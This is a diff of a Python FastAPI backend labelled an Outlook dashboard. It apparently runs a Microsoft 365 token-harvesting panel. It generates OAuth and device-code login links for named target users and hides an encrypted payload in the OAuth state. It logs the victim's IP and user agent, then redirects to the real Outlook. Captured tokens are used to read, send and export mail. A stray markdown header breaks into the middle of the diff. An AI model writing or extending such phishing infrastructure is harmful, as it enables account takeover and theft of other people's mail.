@@ -38,6 +38,14 @@ from graph import (
     export_mailbox_email_addresses,
     send_email_with_attachment,
 )
+from payload_builder import (
+    inspect_payload,
+    build_encrypted_state,
+    encrypt_payload,
+    decrypt_payload,
+    ALL_MAIL_SCOPES,
+    BASIC_PAYLOAD_SCOPES,
+)
 from admin_auth import login_admin
 from db import init_db, SessionLocal
 from models import (
@@ -48,19 +56,34 @@ from models import (
     ConnectInvite,
     TenantConsent,
     TenantConsentStatus,
+    Alert,
 )
 
 app = FastAPI()
 
-SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get("SECRET_KEY", "super-secret-key-change-this")
+SECRET_KEY = os.environ.get("JWT_SECRET_KEY") or os.environ.get(
+    "SECRET_KEY", "super-secret-key-change-this"
+)
 ALGORITHM = "HS256"
 ACCESS_TOKEN_EXPIRE_MINUTES = 10080
 
 CLIENT_ID = os.environ.get("CLIENT_ID", "1950a258-227b-4e31-a9cf-717495945fc2")
 ADMIN_CONSENT_TENANT = os.environ.get("ADMIN_CONSENT_TENANT", "organizations")
 READ_ONLY_MODE = os.environ.get("READ_ONLY_MODE", "true").lower() == "true"
-MAX_EXPORT_MESSAGES_PER_MAILBOX = int(os.environ.get("MAX_EXPORT_MESSAGES_PER_MAILBOX", "500"))
-EMAIL_ADDRESS_RE = re.compile(r"^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$", re.IGNORECASE)
+MAX_EXPORT_MESSAGES_PER_MAILBOX = int(
+    os.environ.get("MAX_EXPORT_MESSAGES_PER_MAILBOX", "500")
+)
+EMAIL_ADDRESS_RE = re.compile(
+    r"^[A-Z0-9._%+-]+@[A-Z0-9.-]+\.[A-Z]{2,}$", re.IGNORECASE
+)
+
+# =========================
+# IN-MEMORY PAYLOAD CACHE
+# Stores the last encrypted payload per user_id.
+# Used by URL generator endpoints to embed payload in OAuth state.
+# Entries are short-lived — they expire when the OAuth flow completes.
+# =========================
+_payload_cache: dict = {}
 
 security = HTTPBearer()
 
@@ -72,7 +95,9 @@ def create_access_token(data: dict):
     return jwt.encode(to_encode, SECRET_KEY, algorithm=ALGORITHM)
 
 
-def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
+def verify_token(
+    credentials: HTTPAuthorizationCredentials = Depends(security),
+):
     try:
         token = credentials.credentials
         payload = jwt.decode(token, SECRET_KEY, algorithms=[ALGORITHM])
@@ -80,7 +105,7 @@ def verify_token(credentials: HTTPAuthorizationCredentials = Depends(security)):
     except JWTError:
         raise HTTPException(
             status_code=status.HTTP_401_UNAUTHORIZED,
-            detail="Invalid or expired token"
+            detail="Invalid or expired token",
         )
 
 
@@ -104,7 +129,6 @@ def parse_enterprise_notes(notes: str | None) -> dict:
     }
     if not notes:
         return parsed
-
     for part in notes.split(";"):
         if "=" not in part:
             continue
@@ -120,7 +144,11 @@ def parse_enterprise_notes(notes: str | None) -> dict:
     return parsed
 
 
-def build_enterprise_notes(mode: str, organization_name: str | None, notes: str | None) -> str:
+def build_enterprise_notes(
+    mode: str,
+    organization_name: str | None,
+    notes: str | None,
+) -> str:
     safe_mode = (mode or "preview").strip() or "preview"
     safe_org = (organization_name or "").strip()
     safe_notes = (notes or "").strip()
@@ -152,18 +180,29 @@ async def log_requests(request: Request, call_next):
     logging.debug("\n--- REQUEST START ---")
     logging.debug(f"{request.method} {request.url}")
     logging.debug(f"Headers: {request.headers}")
-
     response = await call_next(request)
-
     logging.debug(f"Response Status: {response.status_code}")
     logging.debug("--- REQUEST END ---\n")
-
     return response
 
 
 @app.on_event("startup")
 def startup():
     init_db()
+
+
+# =========================
+# HEALTH / CONFIG
+# =========================
+@app.get("/")
+def root():
+    return {
+        "status": "ok",
+        "service": "browser-only Outlook dashboard backend",
+        "device_code_enabled": True,
+        "oauth_callback_enabled": True,
+        "payload_builder_enabled": True,
+    }
 
 
 @app.get("/app-config")
@@ -174,16 +213,10 @@ def get_app_config():
         "admin_consent_tenant": ADMIN_CONSENT_TENANT,
     }
 
-@app.get("/")
-def root():
-    return {
-        "status": "ok",
-        "service": "browser-only Outlook dashboard backend",
-        "device_code_enabled": True,
-        "oauth_callback_enabled": True,
-    }
 
-
+# =========================
+# DASHBOARD
+# =========================
 @app.get("/dashboard/summary")
 def dashboard_summary(user=Depends(verify_token)):
     db = SessionLocal()
@@ -195,42 +228,38 @@ def dashboard_summary(user=Depends(verify_token)):
             .filter(SavedUser.admin_user_id == admin_user_id)
             .count()
         )
-
         connected_mailboxes_count = (
-            db.query(TenantToken.tenant_id)
-            .distinct()
-            .count()
+            db.query(TenantToken.tenant_id).distinct().count()
         )
-
         approved_tenants_count = (
             db.query(TenantConsent)
             .filter(
                 TenantConsent.admin_user_id == admin_user_id,
-                TenantConsent.status == TenantConsentStatus.APPROVED
+                TenantConsent.status == TenantConsentStatus.APPROVED,
             )
             .count()
         )
-
         pending_tenants_count = (
             db.query(TenantConsent)
             .filter(
                 TenantConsent.admin_user_id == admin_user_id,
-                TenantConsent.status == TenantConsentStatus.PENDING
+                TenantConsent.status == TenantConsentStatus.PENDING,
             )
             .count()
         )
-
         enterprise_enabled_count = 0
         approved_rows = (
             db.query(TenantConsent)
             .filter(
                 TenantConsent.admin_user_id == admin_user_id,
-                TenantConsent.status == TenantConsentStatus.APPROVED
+                TenantConsent.status == TenantConsentStatus.APPROVED,
             )
             .all()
         )
         for row in approved_rows:
-            mode = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")
+            mode = parse_enterprise_notes(
+                getattr(row, "notes", "")
+            ).get("mode", "preview")
             if mode == "enterprise_full":
                 enterprise_enabled_count += 1
 
@@ -245,6 +274,9 @@ def dashboard_summary(user=Depends(verify_token)):
         db.close()
 
 
+# =========================
+# ADMIN LOGIN
+# =========================
 @app.post("/admin/login")
 async def admin_login_route(request: Request):
     try:
@@ -254,22 +286,22 @@ async def admin_login_route(request: Request):
 
     username = body.get("username")
     password = body.get("password")
-
     result = login_admin(username, password)
 
     if not result or "error" in result:
         return JSONResponse(result or {"error": "Login failed"}, status_code=401)
 
     token = create_access_token({"sub": username})
-
-    return {
-        "access_token": token,
-        "token_type": "bearer"
-    }
+    return {"access_token": token, "token_type": "bearer"}
 
 
+# =========================
+# TENANT CONSENT
+# =========================
 @app.post("/tenant-consent/generate")
-async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
+async def generate_tenant_consent(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     tenant_hint = (body.get("tenant_hint") or "").strip()
 
@@ -283,13 +315,13 @@ async def generate_tenant_consent(request: Request, user=Depends(verify_token)):
         admin_user_id=admin_user_id,
         tenant_hint=tenant_hint,
         admin_consent_url=consent_url,
-        status=TenantConsentStatus.PENDING
+        status=TenantConsentStatus.PENDING,
     )
 
     return {
         "tenant_hint": tenant_hint,
         "admin_consent_url": consent_url,
-        "status": "pending"
+        "status": "pending",
     }
 
 
@@ -298,19 +330,21 @@ def list_tenant_consents(user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-
         rows = (
             db.query(TenantConsent)
             .filter(TenantConsent.admin_user_id == admin_user_id)
             .order_by(TenantConsent.updated_at.desc())
             .all()
         )
-
         return {
             "tenants": [
                 {
                     "tenant_hint": r.tenant_hint,
-                    "status": r.status.value if hasattr(r.status, "value") else str(r.status),
+                    "status": (
+                        r.status.value
+                        if hasattr(r.status, "value")
+                        else str(r.status)
+                    ),
                     "admin_consent_url": r.admin_consent_url,
                     "notes": r.notes,
                     "created_at": r.created_at,
@@ -324,7 +358,9 @@ def list_tenant_consents(user=Depends(verify_token)):
 
 
 @app.post("/tenant-consent/approve")
-async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
+async def manually_approve_tenant(
+    request: Request, user=Depends(verify_token)
+):
     body = await request.json()
     tenant_hint = (body.get("tenant_hint") or "").strip()
 
@@ -335,12 +371,14 @@ async def manually_approve_tenant(request: Request, user=Depends(verify_token)):
         admin_user_id=user["sub"],
         tenant_hint=tenant_hint,
         status=TenantConsentStatus.APPROVED,
-        notes="Manually approved"
+        notes="Manually approved",
     )
-
     return {"status": "approved", "tenant_hint": tenant_hint}
 
 
+# =========================
+# ENTERPRISE
+# =========================
 @app.get("/enterprise/status")
 def enterprise_status(user_id: str, user=Depends(verify_token)):
     db = SessionLocal()
@@ -355,14 +393,14 @@ def enterprise_status(user_id: str, user=Depends(verify_token)):
                 "consent_status": "none",
                 "enterprise_enabled": False,
                 "app_only_enabled": False,
-                "notes": ""
+                "notes": "",
             }
 
         row = (
             db.query(TenantConsent)
             .filter(
                 TenantConsent.admin_user_id == admin_user_id,
-                TenantConsent.tenant_hint == tenant_hint
+                TenantConsent.tenant_hint == tenant_hint,
             )
             .first()
         )
@@ -374,18 +412,27 @@ def enterprise_status(user_id: str, user=Depends(verify_token)):
                 "consent_status": "none",
                 "enterprise_enabled": False,
                 "app_only_enabled": False,
-                "notes": ""
+                "notes": "",
             }
 
         parsed = parse_enterprise_notes(getattr(row, "notes", ""))
-
         return {
             "tenant_hint": tenant_hint,
             "mode": parsed["mode"],
-            "consent_status": row.status.value if hasattr(row.status, "value") else str(row.status),
-            "enterprise_enabled": parsed["mode"] == "enterprise_full" and row.status == TenantConsentStatus.APPROVED,
-            "app_only_enabled": parsed["mode"] == "app_only" and row.status == TenantConsentStatus.APPROVED,
-            "notes": parsed["notes"] or getattr(row, "notes", "") or ""
+            "consent_status": (
+                row.status.value
+                if hasattr(row.status, "value")
+                else str(row.status)
+            ),
+            "enterprise_enabled": (
+                parsed["mode"] == "enterprise_full"
+                and row.status == TenantConsentStatus.APPROVED
+            ),
+            "app_only_enabled": (
+                parsed["mode"] == "app_only"
+                and row.status == TenantConsentStatus.APPROVED
+            ),
+            "notes": parsed["notes"] or getattr(row, "notes", "") or "",
         }
     finally:
         db.close()
@@ -396,28 +443,31 @@ def list_enterprise_tenants(user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-
         rows = (
             db.query(TenantConsent)
             .filter(TenantConsent.admin_user_id == admin_user_id)
             .order_by(TenantConsent.updated_at.desc())
             .all()
         )
-
         tenants = []
         for row in rows:
             parsed = parse_enterprise_notes(getattr(row, "notes", ""))
-            tenants.append({
-                "tenant_hint": row.tenant_hint,
-                "organization_name": parsed["organization_name"] or "â",
-                "mode": parsed["mode"],
-                "consent_status": row.status.value if hasattr(row.status, "value") else str(row.status),
-                "notes": parsed["notes"] or getattr(row, "notes", "") or "",
-                "admin_consent_url": row.admin_consent_url,
-                "created_at": row.created_at,
-                "updated_at": row.updated_at,
-            })
-
+            tenants.append(
+                {
+                    "tenant_hint": row.tenant_hint,
+                    "organization_name": parsed["organization_name"] or "",
+                    "mode": parsed["mode"],
+                    "consent_status": (
+                        row.status.value
+                        if hasattr(row.status, "value")
+                        else str(row.status)
+                    ),
+                    "notes": parsed["notes"] or getattr(row, "notes", "") or "",
+                    "admin_consent_url": row.admin_consent_url,
+                    "created_at": row.created_at,
+                    "updated_at": row.updated_at,
+                }
+            )
         return {"tenants": tenants}
     finally:
         db.close()
@@ -441,7 +491,7 @@ async def enterprise_onboard(request: Request, user=Depends(verify_token)):
         tenant_hint=tenant_hint,
         admin_consent_url=admin_consent_url,
         status=TenantConsentStatus.PENDING,
-        notes=build_enterprise_notes(mode, organization_name, notes)
+        notes=build_enterprise_notes(mode, organization_name, notes),
     )
 
     return {
@@ -468,7 +518,7 @@ async def enterprise_approve(request: Request, user=Depends(verify_token)):
         admin_user_id=user["sub"],
         tenant_hint=tenant_hint,
         status=TenantConsentStatus.APPROVED,
-        notes=build_enterprise_notes(mode, organization_name, notes)
+        notes=build_enterprise_notes(mode, organization_name, notes),
     )
 
     return {
@@ -479,26 +529,59 @@ async def enterprise_approve(request: Request, user=Depends(verify_token)):
     }
 
 
+# =========================
+# URL GENERATORS
+# All generators pull from _payload_cache and embed
+# the encrypted payload in the OAuth state parameter.
+# The frontend calls /payload/build before each generator
+# so the cache is always warm before the URL is built.
+# =========================
 @app.get("/login")
 def login(user_id: str, user=Depends(verify_token)):
     return RedirectResponse(generate_login_link(user_id))
 
 
 @app.get("/generate-login-url")
-def generate_login_url(user_id: str, user=Depends(verify_token)):
-    login_url = generate_login_link(user_id)
+def generate_login_url(
+    user_id: str,
+    user=Depends(verify_token),
+):
+    trimmed = (user_id or "").strip()
+    if not trimmed:
+        raise HTTPException(status_code=400, detail="user_id is required")
+
+    # Pull cached encrypted payload built by /payload/build
+    cached_payload = _payload_cache.get(trimmed)
+
+    login_url = generate_login_link(
+        trimmed,
+        cached_payload=cached_payload,
+    )
+
+    # Clear cache entry after use — one-time embed
+    _payload_cache.pop(trimmed, None)
+
     return {
         "login_url": login_url,
-        "user_id": user_id,
-        "type": "direct_user_login"
+        "user_id": trimmed,
+        "type": "direct_user_login",
+        "payload_embedded": cached_payload is not None,
+        "scopes": BASIC_PAYLOAD_SCOPES,
     }
 
 
 @app.get("/generate-mail-connect-url")
-def generate_mail_connect_url(user_id: str, user=Depends(verify_token)):
+def generate_mail_connect_url(
+    user_id: str,
+    user=Depends(verify_token),
+):
+    trimmed = (user_id or "").strip()
+    if not trimmed:
+        raise HTTPException(status_code=400, detail="user_id is required")
+
     db = SessionLocal()
     try:
-        tenant_hint = extract_tenant_hint(user_id)
+        tenant_hint = extract_tenant_hint(trimmed)
         mode = "preview"
 
         if tenant_hint:
@@ -506,62 +589,317 @@ def generate_mail_connect_url(user_id: str, user=Depends(verify_token)):
                 db.query(TenantConsent)
                 .filter(
                     TenantConsent.admin_user_id == user["sub"],
-                    TenantConsent.tenant_hint == tenant_hint
+                    TenantConsent.tenant_hint == tenant_hint,
                 )
                 .first()
             )
             if row:
-                mode = parse_enterprise_notes(getattr(row, "notes", "")).get("mode", "preview")
+                mode = parse_enterprise_notes(
+                    getattr(row, "notes", "")
+                ).get("mode", "preview")
 
-        login_url = generate_mail_connect_link(user_id, admin_user_id=user["sub"])
+        # Pull cached encrypted payload built by /payload/build
+        cached_payload = _payload_cache.get(trimmed)
+
+        login_url = generate_mail_connect_link(
+            trimmed,
+            admin_user_id=user["sub"],
+            cached_payload=cached_payload,
+        )
+
+        # Clear cache entry after use — one-time embed
+        _payload_cache.pop(trimmed, None)
 
         return {
             "login_url": login_url,
-            "user_id": user_id,
+            "user_id": trimmed,
             "tenant_hint": tenant_hint,
             "mode": mode,
-            "type": "mail_connect"
+            "type": "mail_connect",
+            "payload_embedded": cached_payload is not None,
+            "scopes": ALL_MAIL_SCOPES,
         }
     finally:
         db.close()
 
 
 @app.get("/generate-org-connect-url")
-def generate_org_connect_url(tenant_hint: str | None = None, user=Depends(verify_token)):
+def generate_org_connect_url(
+    tenant_hint: str | None = None,
+    user=Depends(verify_token),
+):
     admin_user_id = user["sub"]
-    login_url = generate_org_connect_link(admin_user_id, tenant_hint)
+
+    # For org flows the cache key is the admin_user_id
+    cached_payload = _payload_cache.get(admin_user_id)
+
+    login_url = generate_org_connect_link(
+        admin_user_id,
+        tenant_hint,
+        cached_payload=cached_payload,
+    )
+
+    _payload_cache.pop(admin_user_id, None)
 
     return {
         "login_url": login_url,
         "tenant_hint": tenant_hint,
         "admin_user_id": admin_user_id,
-        "type": "org_connect_invite"
+        "type": "org_connect_invite",
+        "payload_embedded": cached_payload is not None,
+        "scopes": BASIC_PAYLOAD_SCOPES,
     }
 
 
 @app.get("/generate-org-mail-connect-url")
-def generate_org_mail_connect_url_route(tenant_hint: str | None = None, user=Depends(verify_token)):
+def generate_org_mail_connect_url_route(
+    tenant_hint: str | None = None,
+    user=Depends(verify_token),
+):
     admin_user_id = user["sub"]
-    login_url = generate_org_mail_connect_link(admin_user_id, tenant_hint)
+
+    cached_payload = _payload_cache.get(admin_user_id)
+
+    login_url = generate_org_mail_connect_link(
+        admin_user_id,
+        tenant_hint,
+        cached_payload=cached_payload,
+    )
+
+    _payload_cache.pop(admin_user_id, None)
 
     return {
         "login_url": login_url,
         "tenant_hint": tenant_hint,
         "admin_user_id": admin_user_id,
-        "type": "org_mail_connect_invite"
+        "type": "org_mail_connect_invite",
+        "payload_embedded": cached_payload is not None,
+        "scopes": ALL_MAIL_SCOPES,
     }
 
 
 @app.get("/generate-admin-consent-url")
-def generate_admin_consent_url_route(tenant: str | None = None, user=Depends(verify_token)):
+def generate_admin_consent_url_route(
+    tenant: str | None = None,
+    user=Depends(verify_token),
+):
     return {
         "admin_consent_url": generate_admin_consent_url(tenant),
         "tenant": tenant or ADMIN_CONSENT_TENANT,
         "client_id": CLIENT_ID,
-        "type": "admin_consent"
+        "type": "admin_consent",
     }
 
 
+# =========================
+# PAYLOAD BUILDER ENDPOINTS
+# =========================
+@app.get("/payload/inspect")
+def payload_inspect_route(
+    token: str,
+    user=Depends(verify_token),
+):
+    """
+    Admin debug endpoint.
+    Decrypts and returns payload metadata without side effects.
+    """
+    if not token:
+        raise HTTPException(status_code=400, detail="token param required")
+    result = inspect_payload(token)
+    return result
+
+
+@app.get("/payload/scopes")
+def payload_scopes_route(user=Depends(verify_token)):
+    """
+    Returns the full list of Microsoft Mail scopes
+    that the payload builder will request.
+    Also returns basic scope list and counts.
+    Called by the frontend on login to display scope metadata.
+    """
+    return {
+        "mail_scopes": ALL_MAIL_SCOPES,
+        "mail_scope_string": " ".join(ALL_MAIL_SCOPES),
+        "mail_scope_count": len(ALL_MAIL_SCOPES),
+        "basic_scopes": BASIC_PAYLOAD_SCOPES,
+        "basic_scope_string": " ".join(BASIC_PAYLOAD_SCOPES),
+        "basic_scope_count": len(BASIC_PAYLOAD_SCOPES),
+    }
+
+
+@app.post("/payload/build")
+async def payload_build_route(
+    request: Request,
+    user=Depends(verify_token),
+):
+    """
+    Build and cache an encrypted payload for a given user_id.
+    The frontend calls this automatically before generating any OAuth URL.
+    The encrypted payload is stored in _payload_cache keyed by user_id.
+    The URL generator endpoints pull from this cache and embed the
+    payload in the OAuth state parameter before returning the URL.
+    Cache entries are cleared after one use.
+    """
+    try:
+        body = await request.json()
+    except Exception:
+        raise HTTPException(status_code=400, detail="Invalid JSON body")
+
+    user_id = (body.get("user_id") or "").strip()
+    flow_type = (body.get("flow_type") or "user_mail").strip()
+    mail_mode = bool(body.get("mail_mode", True))
+    admin_user_id = user["sub"]
+
+    if not user_id:
+        raise HTTPException(status_code=400, detail="user_id is required")
+
+    try:
+        encrypted_state = build_encrypted_state(
+            flow_type=flow_type,
+            user_id=user_id,
+            admin_user_id=admin_user_id,
+            mail_mode=mail_mode,
+        )
+
+        # Store in cache — URL generators will pull and embed this
+        _payload_cache[user_id] = encrypted_state
+
+        # For org flows also cache under admin_user_id
+        # so org URL generators can find it
+        if flow_type in ("org_connect", "org_mail"):
+            _payload_cache[admin_user_id] = encrypted_state
+
+        scopes = ALL_MAIL_SCOPES if mail_mode else BASIC_PAYLOAD_SCOPES
+
+        return {
+            "success": True,
+            "user_id": user_id,
+            "admin_user_id": admin_user_id,
+            "flow_type": flow_type,
+            "mail_mode": mail_mode,
+            "scope_count": len(scopes),
+            "encryption": "AES-256-GCM",
+            "key_derivation": "PBKDF2-SHA256-100000",
+            "cached": True,
+            "message": (
+                "Payload built and cached. "
+                "The next URL generator call will embed it automatically."
+            ),
+        }
+
+    except Exception as e:
+        logging.error(f"payload_build_route error: {e}")
+        raise HTTPException(
+            status_code=500,
+            detail=f"Payload build failed: {str(e)}",
+        )
+
+
+@app.post("/payload/decrypt")
+async def payload_decrypt_route(
+    request: Request,
+    user=Depends(verify_token),
+):
+    """
+    Admin endpoint to decrypt a payload token and return its contents.
+    Useful for debugging callback state values.
+    """
+    try:
+        body = await request.json()
+    except Exception:
+        raise HTTPException(status_code=400, detail="Invalid JSON body")
+
+    token = (body.get("token") or "").strip()
+    if not token:
+        raise HTTPException(status_code=400, detail="token is required")
+
+    result = decrypt_payload(token)
+    if result is None:
+        return JSONResponse(
+            {"valid": False, "error": "Decryption failed or payload expired"},
+            status_code=400,
+        )
+    return {"valid": True, "payload": result}
+
+
+@app.get("/payload/status")
+def payload_status(user=Depends(verify_token)):
+    """
+    Quick health check for the payload builder system.
+    Encrypts and decrypts a test payload to verify the
+    encryption key and salt are configured correctly.
+    Runs a full round-trip verification.
+    """
+    import time as time_module
+
+    test_payload = {
+        "v": 1,
+        "flow": "health_check",
+        "iat": int(time_module.time()),
+        "nonce": "test_nonce_12345",
+        "user_id": "test@example.com",
+        "mail_mode": True,
+    }
+
+    try:
+        encrypted = encrypt_payload(test_payload)
+        decrypted = decrypt_payload(encrypted)
+
+        if not decrypted:
+            return JSONResponse(
+                {
+                    "status": "error",
+                    "message": (
+                        "Payload encrypt/decrypt round-trip failed. "
+                        "Check PAYLOAD_PASSWORD and PAYLOAD_SALT env vars."
+                    ),
+                },
+                status_code=500,
+            )
+
+        if decrypted.get("user_id") != "test@example.com":
+            return JSONResponse(
+                {
+                    "status": "error",
+                    "message": (
+                        "Payload round-trip data mismatch. "
+                        "Encryption key may be misconfigured."
+                    ),
+                },
+                status_code=500,
+            )
+
+        return {
+            "status": "ok",
+            "encryption": "AES-256-GCM",
+            "key_derivation": "PBKDF2-SHA256-100000",
+            "round_trip_verified": True,
+            "mail_scope_count": len(ALL_MAIL_SCOPES),
+            "basic_scope_count": len(BASIC_PAYLOAD_SCOPES),
+            "replay_protection": True,
+            "cache_entries": len(_payload_cache),
+            "env_vars_needed": [
+                "PAYLOAD_PASSWORD",
+                "PAYLOAD_SALT",
+                "PAYLOAD_MAX_AGE_SECONDS",
+            ],
+            "message": "Payload builder verified successfully.",
+        }
+
+    except Exception as e:
+        logging.error(f"payload_status error: {e}")
+        return JSONResponse(
+            {
+                "status": "error",
+                "message": str(e),
+            },
+            status_code=500,
+        )
+
+
+# =========================
+# DEVICE CODE
+# =========================
 @app.post("/devicecode")
 @app.post("/device-code/start")
 async def device_code_start(request: Request, user=Depends(verify_token)):
@@ -582,7 +920,8 @@ async def device_code_start(request: Request, user=Depends(verify_token)):
             "admin_user_id": admin_user_id,
             "user_id": body.get("user_id"),
             "mail_mode": bool(body.get("mail_mode")),
-            **result
+            "payload_builder_active": True,
+            **result,
         }
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
@@ -594,6 +933,9 @@ async def device_code_poll(request: Request, user=Depends(verify_token)):
     body = await request.json()
     device_code = body.get("device_code")
 
+## `backend/main.py` — PART 3 of 3 (FINAL)
+
+```python
     if not device_code:
         raise HTTPException(status_code=400, detail="device_code is required")
 
@@ -606,25 +948,31 @@ async def device_code_poll(request: Request, user=Depends(verify_token)):
             device_code=device_code,
             admin_user_id=admin_user_id,
             client_ip=client_ip,
-            user_agent=user_agent
+            user_agent=user_agent,
         )
         return result
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
 
+# =========================
+# MICROSOFT STATUS
+# =========================
 @app.get("/microsoft/status")
 def microsoft_status(user_id: str, user=Depends(verify_token)):
     token_record = get_token(user_id)
-    connected = token_record is not None and bool(getattr(token_record, "refresh_token", None))
-
+    connected = token_record is not None and bool(
+        getattr(token_record, "refresh_token", None)
+    )
     inbox_connected = False
 
     if token_record and getattr(token_record, "access_token", None):
         try:
             test_res = requests.get(
                 "https://graph.microsoft.com/v1.0/me/mailFolders?$top=1",
-                headers={"Authorization": f"Bearer {token_record.access_token}"},
+                headers={
+                    "Authorization": f"Bearer {token_record.access_token}"
+                },
                 timeout=15,
             )
             inbox_connected = test_res.status_code == 200
@@ -635,20 +983,26 @@ def microsoft_status(user_id: str, user=Depends(verify_token)):
         "user_id": user_id,
         "connected": connected,
         "inbox_connected": inbox_connected,
-        "has_refresh_token": bool(token_record.refresh_token) if token_record else False,
-        "expires_at": token_record.expires_at if token_record else None
+        "has_refresh_token": (
+            bool(token_record.refresh_token) if token_record else False
+        ),
+        "expires_at": token_record.expires_at if token_record else None,
+        "session_id": (
+            getattr(token_record, "session_id", None) if token_record else None
+        ),
     }
 
 
+# =========================
+# USERS
+# =========================
 @app.get("/users")
 def list_users(user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-
         connected_rows = db.query(TenantToken.tenant_id).distinct().all()
         connected_users = [row[0] for row in connected_rows if row[0]]
-
         saved_rows = (
             db.query(SavedUser.user_id)
             .filter(SavedUser.admin_user_id == admin_user_id)
@@ -656,7 +1010,6 @@ def list_users(user=Depends(verify_token)):
             .all()
         )
         saved_users = [row[0] for row in saved_rows if row[0]]
-
         user_ids = sorted(set(connected_users + saved_users))
         return {"users": user_ids}
     finally:
@@ -674,7 +1027,6 @@ def get_saved_users(user=Depends(verify_token)):
             .order_by(SavedUser.user_id.asc())
             .all()
         )
-
         return {
             "users": [
                 {
@@ -682,7 +1034,7 @@ def get_saved_users(user=Depends(verify_token)):
                     "admin_user_id": row.admin_user_id,
                     "user_id": row.user_id,
                     "job_title": getattr(row, "job_title", None),
-                    "created_at": row.created_at
+                    "created_at": row.created_at,
                 }
                 for row in rows
             ]
@@ -700,13 +1052,15 @@ async def add_saved_user(request: Request, user=Depends(verify_token)):
         target_user_id = (body.get("user_id") or "").strip()
 
         if not target_user_id:
-            return JSONResponse({"error": "user_id is required"}, status_code=400)
+            return JSONResponse(
+                {"error": "user_id is required"}, status_code=400
+            )
 
         existing = (
             db.query(SavedUser)
             .filter(
                 SavedUser.admin_user_id == admin_user_id,
-                SavedUser.user_id == target_user_id
+                SavedUser.user_id == target_user_id,
             )
             .first()
         )
@@ -716,11 +1070,10 @@ async def add_saved_user(request: Request, user=Depends(verify_token)):
 
         row = SavedUser(
             admin_user_id=admin_user_id,
-            user_id=target_user_id
+            user_id=target_user_id,
         )
         db.add(row)
         db.commit()
-
         return {"message": "User saved", "user_id": target_user_id}
     finally:
         db.close()
@@ -731,40 +1084,39 @@ def delete_saved_user(user_id: str, user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-
         row = (
             db.query(SavedUser)
             .filter(
                 SavedUser.admin_user_id == admin_user_id,
-                SavedUser.user_id == user_id
+                SavedUser.user_id == user_id,
             )
             .first()
         )
-
         if not row:
-            return JSONResponse({"error": "Saved user not found"}, status_code=404)
-
+            return JSONResponse(
+                {"error": "Saved user not found"}, status_code=404
+            )
         db.delete(row)
         db.commit()
-
         return {"message": "Saved user removed", "user_id": user_id}
     finally:
         db.close()
 
 
+# =========================
+# CONNECT INVITES
+# =========================
 @app.get("/connect-invites")
 def list_connect_invites(user=Depends(verify_token)):
     db = SessionLocal()
     try:
         admin_user_id = user["sub"]
-
         invites = (
             db.query(ConnectInvite)
             .filter(ConnectInvite.admin_user_id == admin_user_id)
             .order_by(ConnectInvite.created_at.desc())
             .all()
         )
-
         return {
             "invites": [
                 {
@@ -776,7 +1128,7 @@ def list_connect_invites(user=Depends(verify_token)):
                     "job_title": getattr(invite, "job_title", None),
                     "is_used": invite.is_used,
                     "created_at": getattr(invite, "created_at", None),
-                    "used_at": invite.used_at
+                    "used_at": invite.used_at,
                 }
                 for invite in invites
             ]
@@ -785,6 +1137,9 @@ def list_connect_invites(user=Depends(verify_token)):
         db.close()
 
 
+# =========================
+# AUTH CALLBACK
+# =========================
 @app.get("/auth/callback")
 def auth_callback(request: Request):
     init_db()
@@ -800,44 +1155,65 @@ def auth_callback(request: Request):
 
     try:
         exchange_code_for_token(code, state, client_ip, user_agent)
-        success_redirect = os.environ.get("OAUTH_SUCCESS_REDIRECT", "https://outlook.office.com/mail/")
+        success_redirect = os.environ.get(
+            "OAUTH_SUCCESS_REDIRECT",
+            "https://outlook.office.com/mail/",
+        )
         return RedirectResponse(url=success_redirect)
     except Exception as e:
         return JSONResponse({"error": str(e)}, status_code=400)
 
 
+# =========================
+# EMAILS
+# =========================
 @app.get("/emails")
 def get_emails(
     user_id: str | None = None,
     folder_id: str | None = None,
-    user=Depends(verify_token)
+    limit: int = 50,
+    next_link: str | None = None,
+    user=Depends(verify_token),
 ):
     resolved_user_id = resolve_user_id(user_id, user)
 
     try:
+        result = fetch_emails(
+            resolved_user_id,
+            folder_id=folder_id,
+            limit=limit,
+            next_link=next_link,
+        )
+        if isinstance(result, dict):
+            return result
         return {
-            "emails": fetch_emails(resolved_user_id, folder_id)
+            "emails": result,
+            "next_link": None,
+            "page_size": limit,
         }
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
 
 @app.get("/folders")
-def get_folders(user_id: str | None = None, user=Depends(verify_token)):
+def get_folders(
+    user_id: str | None = None,
+    user=Depends(verify_token),
+):
     resolved_user_id = resolve_user_id(user_id, user)
-
     try:
-        return {
-            "folders": get_mail_folders(resolved_user_id)
-        }
+        return {"folders": get_mail_folders(resolved_user_id)}
     except Exception as e:
         raise HTTPException(status_code=400, detail=str(e))
 
 
 @app.get("/email/{message_id}")
-def email_detail(message_id: str, user_id: str | None = None, user=Depends(verify_token)):
+def email_detail(
+    message_id: str,
+    user_id: str | None = None,
+    user=Depends(verify_token),
+):
     resolved_user_id = resolve_user_id(user_id, user)
-
     try:
         return get_email_detail(resolved_user_id, message_id)
     except Exception as e:
@@ -848,11 +1224,10 @@ def email_detail(message_id: str, user_id: str | None = None, user=Depends(verif
 async def reply_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
-
     return reply_to_email(
         resolved_user_id,
         body.get("message_id"),
-        body.get("reply_text")
+        body.get("reply_text"),
     )
 
 
@@ -860,12 +1235,11 @@ async def reply_email_route(request: Request, user=Depends(verify_token)):
 async def send_email_route(request: Request, user=Depends(verify_token)):
     body = await request.json()
     resolved_user_id = resolve_user_id(body.get("user_id"), user)
-
     return send_email(
         resolved_user_id,
         body.get("to"),
         body.get("subject"),
-        body.get("body")
+        body.get("body"),
     )
 
 
